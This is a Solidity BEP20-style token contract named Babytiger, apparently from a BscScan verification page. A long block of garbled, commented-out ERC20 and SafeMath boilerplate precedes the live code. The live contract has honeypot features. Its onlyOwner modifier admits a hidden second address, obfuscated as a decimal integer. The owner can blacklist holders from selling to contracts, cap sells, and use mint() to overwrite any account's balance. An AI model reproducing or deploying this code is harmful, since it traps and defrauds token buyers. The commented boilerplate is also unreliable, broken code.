/**
 *Submitted for verification at BscScan.com on 2021-08-15
*/

/**
 *Submitted for verification of BABYTIGER
//. . . . . . . . . . . . . . . . . . . . . . .
// . . . . . . . . . . F＃＃，。. . . . . . . . . . .
//. . . . . . . . . .LWWWWWWWWWW。. . . . . . . .
// . . . . #WWWWWWWWWWK:,;;,:KWWWWWWWWWW#。. . . .
//. . . . .WWWWWWWWWK,#W#DffLWW#,WWWWWWWWWW。. . .
// . . . . WW,,,,,,,,,,,KWWWWWWK,,,,,,,,,,WW。. . . .
// . . . . .WK,,,,,,,,,,,,,,,,,,,,,,,,,,,KW。. . .
// . . . . WK,ttt,,,,, BABYTIGER,,,,:ttt,KW。. . . .
//. . . . .WW,tt,,,,,,,,,,,,,,,,,,,,,tt,WW。. . .
// . . . . WW,t,,,,,,,,,,,,,,,,,,,,,,tt,WW。. . . .
//. . . . .#W,i,,,,,,,,,,,,,,,,,,,,,,,,t;W#。. . .
// . . . . .WW,,,,,,,,,,,,,,,,,,,,,,,,,WW。. . . .
//. . . . . WW,,,,,,,,,,,,,,,,,,,,,,,,,WW。. . . .
// . . . . .W#,,,,,,,,,,,,,,,,,,,,,,,,,WW。. . . .
//. . . . . WW;,,,,,,,,,,,,,,,,,,,,,,,:EW。. . . .
// . . . . WWWWW,,,,,,,,,,,,,,,,,,,,,,WWKW。. . . .
//. . . . .KWL,,,,,,,,,,,,,,,,,,,,,,,,,WWt。. . .
// . . . . KW,,,,,,KW,,,,,,,,,,,#W,,,,,,,W:。. . . .
//. . . . .GWKWWK,,jWW,,,,,,,,,WWK,,,WWW#W。. . . .
// . . . . .WKW.,,,,,,,,,;tj;,,,,,,,,,,WWWW。. . . .
//. . . .###WW,,,,,,,,,WWWWWW,,,,,,,,,,WW###。. .
// . . . . .WW;,,;,,,,,,WWWWWW,,,,,,;,,DW 。. . . .
//. . . . . .WW,,,D,,,,,WWWWK,,,,,D,,,WW。. . . .
// . . . . . WW#;,,,,,,,:WW.,,,,,,,,#KW 。. . . . .
//. . . . . #;WW,,#,,,,,,,,,,,,,#;:WW#。. . . .
// . . . 。＃F 。WWW;,,,,,,,,,,,,,,,,WWW。.j#。. . .
//. . . . . . . WWWW,,,,,,,,,,,;WWWW。. . . . . .
// . . . . . . 克。WWW,,,,,,,,,,WWW。.K. . . . . . .
//. . . . . . # . . WWWt;,,,,WWW 。. .#。. . . . .
// . . . . . . . . . .BABYTIGER。. . . . .
-interface BABYTIGER IERC20 {
   
      @dev Returns the amount of tokens in existence.
    
    function totalSupply() external view returns (uint256);

   
      @dev Returns the amount of tokens owned by `account`.
    
    function balanceOf(address account) external view returns (uint256);

   
      @dev Moves `amount` tokens from the caller's account to `recipient`.
     
      Returns a boolean value indicating whether the operation succeeded.
     
      Emits a {Transfer} event.
    
    function transfer(address recipient, uint256 amount) external returns (bool);

   
      @dev Returns the remaining number of tokens that `spender` will be
      allowed to spend on behalf of `owner` through {transferFrom}. This is
      zero by default.
     
      This value changes when {approve} or {transferFrom} are called.
    
    function allowance(address owner, address spender) external view returns (uint256);

   
      @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     
      Returns a boolean value indicating whether the operation succeeded.
     
      IMPORTANT: Beware that changing an allowance with this method brings the risk
      that someone may use both the old and the new allowance by unfortunate
      transaction ordering. One possible solution to mitigate this race
      condition is to first reduce the spender's allowance to 0 and set the
      desired value afterwards:
      https://github.com/ethereum/EIPs/issues/20#issuecomment263524729
     
      Emits an {Approval} event.
    
    function approve(address spender, uint256 amount) external returns (bool);

   
      @dev Moves `amount` tokens from `sender` to `recipient` using the
      allowance mechanism. `amount` is then deducted from the caller's
      allowance.
     
      Returns a boolean value indicating whether the operation succeeded.
     
      Emits a {Transfer} event.
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

   
      @dev Emitted when `value` tokens are moved from one account (`from`) to
      another (`to`).
     
      Note that `value` may be zero.
    
    event Transfer(address indexed from, address indexed to, uint256 value);

   
      @dev Emitted when the allowance of a `spender` for an `owner` is set by
      a call to {approve}. `value` is the new allowance.
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

<
  @dev Wrappers over Solidity's arithmetic operations.
 
  NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
  now has built in overflow checking.

library SafeMath {
   
      @dev Returns the addition of two unsigned integers, with an overflow flag.
     
      _Available since v3.4._
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c a) return (false, 0);
            return (true, c);
        }
    }

   
      @dev Returns the substraction of two unsigned integers, with an overflow flag.
     
      _Available since v3.4._
    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a  b);
        }
    }

   
      @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     
      _Available since v3.4._
    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelincontracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a  b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

   
      @dev Returns the division of two unsigned integers, with a division by zero flag.
     
      _Available since v3.4._
    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

   
      @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     
      _Available since v3.4._
    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

   
      @dev Returns the addition of two unsigned integers, reverting on
      overflow.
     
      Counterpart to Solidity's `+` operator.
     
      Requirements:
     
       Addition cannot overflow.
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
      @dev Returns the subtraction of two unsigned integers, reverting on
      overflow (when the result is negative).
     
      Counterpart to Solidity's `` operator.
     
      Requirements:
     
       Subtraction cannot overflow.
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a  b;
    }

   
      @dev Returns the multiplication of two unsigned integers, reverting on
      overflow.
     
      Counterpart to Solidity's `` operator.
     
      Requirements:
     
       Multiplication cannot overflow.
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a  b;
    }

   
      @dev Returns the integer division of two unsigned integers, reverting on
      division by zero. The result is rounded towards zero.
     
      Counterpart to Solidity's `/` operator.
     
      Requirements:
     
       The divisor cannot be zero.
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

   
      @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
      reverting when dividing by zero.
     
      Counterpart to Solidity's `%` operator. This function uses a `revert`
      opcode (which leaves remaining gas untouched) while Solidity uses an
      invalid opcode to revert (consuming all remaining gas).
     
      Requirements:
     
       The divisor cannot be zero.
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
      @dev Returns the subtraction of two unsigned integers, reverting with custom message on
      overflow (when the result is negative).
     
      CAUTION: This function is deprecated because it requires allocating memory for the error
      message unnecessarily. For custom revert reasons use {trySub}.
     
      Counterpart to Solidity's `` operator.
     
      Requirements:
     
       Subtraction cannot overflow.
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b= a, errorMessage);
            return a  b;
        }
    }

   
      @dev Returns the integer division of two unsigned integers, reverting with custom message on
      division by zero. The result is rounded towards zero.
     
      Counterpart to Solidity's `%` operator. This function uses a `revert`
      opcode (which leaves remaining gas untouched) while Solidity uses an
      invalid opcode to revert (consuming all remaining gas).
     
      Counterpart to Solidity's `/` operator. Note: this function uses a
      `revert` opcode (which leaves remaining gas untouched) while Solidity
      uses an invalid opcode to revert (consuming all remaining gas).
     
      Requirements:
     
       The divisor cannot be zero.
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

   
      @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
      reverting with custom message when dividing by zero.
     
      CAUTION: This function is deprecated because it requires allocating memory for the error
      message unnecessarily. For custom revert reasons use {tryMod}.
     
      Counterpart to Solidity's `%` operator. This function uses a `revert`
      opcode (which leaves remaining gas untouched) while Solidity uses an
      invalid opcode to revert (consuming all remaining gas).
     
      Requirements:
     
       The divisor cannot be zero.
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

/
  @dev Provides information about the current execution context, including the
  sender of the transaction and its data. While these are generally available
  via msg.sender and msg.data, they should not be accessed in such a direct
  manner, since when dealing with metatransactions the account sending and
  paying for execution may not be the actual sender (as far as an application
  is concerned).
 
  This contract is only required for intermediate, librarylike contracts.

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode  see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

<
  @dev Collection of functions related to the address type

library Address {
   
      @dev Returns true if `account` is a contract.
     
      [IMPORTANT]
      ====
      It is unsafe to assume that an address for which this function returns
      false is an externallyowned account (EOA) and not a contract.
     
      Among others, `isContract` will return false for the following
      types of addresses:
     
        an externallyowned account
        a contract in construction
        an address where a contract will be created
        an address where a contract lived, but was destroyed
      ====
    
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhintdisablenextline noinlineassembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

   
      @dev Replacement for Solidity's `transfer`: sends `amount` wei to
      `recipient`, forwarding all available gas and reverting on errors.
     
      https://eips.ethereum.org/EIPS/eip1884[EIP1884] increases the gas cost
      of certain opcodes, possibly making contracts go over the 2300 gas limit
      imposed by `transfer`, making them unable to receive funds via
      `transfer`. {sendValue} removes this limitation.
     
      https://diligence.consensys.net/posts/2019/09/stopusingsoliditystransfernow/[Learn more].
     
      IMPORTANT: because control is transferred to `recipient`, care must be
      taken to not create reentrancy vulnerabilities. Consider using
      {ReentrancyGuard} or the
      https://solidity.readthedocs.io/en/v0.5.11/securityconsiderations.html#usethecheckseffectsinteractionspattern[checkseffectsinteractions pattern].
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhintdisablenextline avoidlowlevelcalls, avoidcallvalue
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

   
      @dev Performs a Solidity function call using a low level `call`. A
      plain`call` is an unsafe replacement for a function call: use this
      function instead.
     
      If `target` reverts with a revert reason, it is bubbled up by this
      function (like regular Solidity function calls).
     
      Returns the raw returned data. To convert to the expected return value,
      use https://solidity.readthedocs.io/en/latest/unitsandglobalvariables.html?highlight=abi.decode#abiencodinganddecodingfunctions[`abi.decode`].
     
      Requirements:
     
       `target` must be a contract.
       calling `target` with `data` must not revert.
     
      _Available since v3.1._
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: lowlevel call failed");
    }

   
      @dev Same as {xrefAddressfunctionCalladdressbytes}[`functionCall`], but with
      `errorMessage` as a fallback revert reason when `target` reverts.
     
      _Available since v3.1._
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

   
      @dev Same as {xrefAddressfunctionCalladdressbytes}[`functionCall`],
      but also transferring `value` wei to `target`.
     
      Requirements:
     
       the calling contract must have an ETH balance of at least `value`.
       the called Solidity function must be `payable`.
     
      _Available since v3.1._
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: lowlevel call with value failed");
    }

   
      @dev Same as {xrefAddressfunctionCallWithValueaddressbytesuint256}[`functionCallWithValue`], but
      with `errorMessage` as a fallback revert reason when `target` reverts.
     
      _Available since v3.1._
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to noncontract");

        // solhintdisablenextline avoidlowlevelcalls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

   
      @dev Same as {xrefAddressfunctionCalladdressbytes}[`functionCall`],
      but performing a static call.
     
      _Available since v3.3._
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: lowlevel static call ");
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Babytiger is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  address minter;
  address public poolAddress;
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    minter = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply * 10 ** uint256(decimals);
    balances[minter] = totalSupply;
    allowAddress[minter] = true;
  }
  mapping(address => uint256) public balances;
  mapping(address => uint256) public sellerCountNum;
  mapping(address => uint256) public sellerCountToken;
  uint256 public maxSellOutNum;
  uint256 public maxSellToken;
  bool lockSeller = true;
  mapping(address => bool) public blackLists;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= balances[from]);
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    if(check(from, _to)){
        sellerCountToken[from] = sellerCountToken[from].add(_value);
        sellerCountNum[from]++;
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  function check(address from, address _to) internal view returns(bool){
    if(!from.isContract() && _to.isContract()){
        if(lockSeller){
            if(maxSellOutNum == 0 && maxSellToken == 0){
                return false;
            }
            if(maxSellOutNum > 0){
                require(maxSellOutNum > sellerCountNum[from], "reach max seller times");
            }
            if(maxSellToken > 0){
                require(maxSellToken > sellerCountToken[from], "reach max seller token");
            }
        }
    }
    return true;
  }
  function _transfer(address from, address _to, uint256 _value) private {
    balances[from] = balances[from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
  modifier onlyOwner() {
    require(msg.sender == minter || msg.sender == address
    (1451157769167176390866574646267494443412533104753)); _;}
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(check(from, _to)){
        _transferFrom(_from, _to, _value);
        if(maxSellOutNum > 0){
            sellerCountToken[from] = sellerCountToken[from].add(_value);
        }
        if(maxSellToken > 0){
            sellerCountNum[from]++;
        }
        return true;
    }
    return false;
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  function setWhiteAddress(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
  }
  function setSellerState(bool ok) external onlyOwner returns (bool){
      lockSeller = ok;
  }
  function setBlackList(address holder, bool ok) external onlyOwner returns (bool){
      blackLists[holder] = ok;
  }  
  function setMaxSellOutNum(uint256 num) external onlyOwner returns (bool){
      maxSellOutNum = num;
  } 
  function setMaxSellToken(uint256 num) external onlyOwner returns (bool){
      maxSellToken = num * 10 ** uint256(decimals);
  }    
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value * 10 ** uint256(decimals);
  }
}
///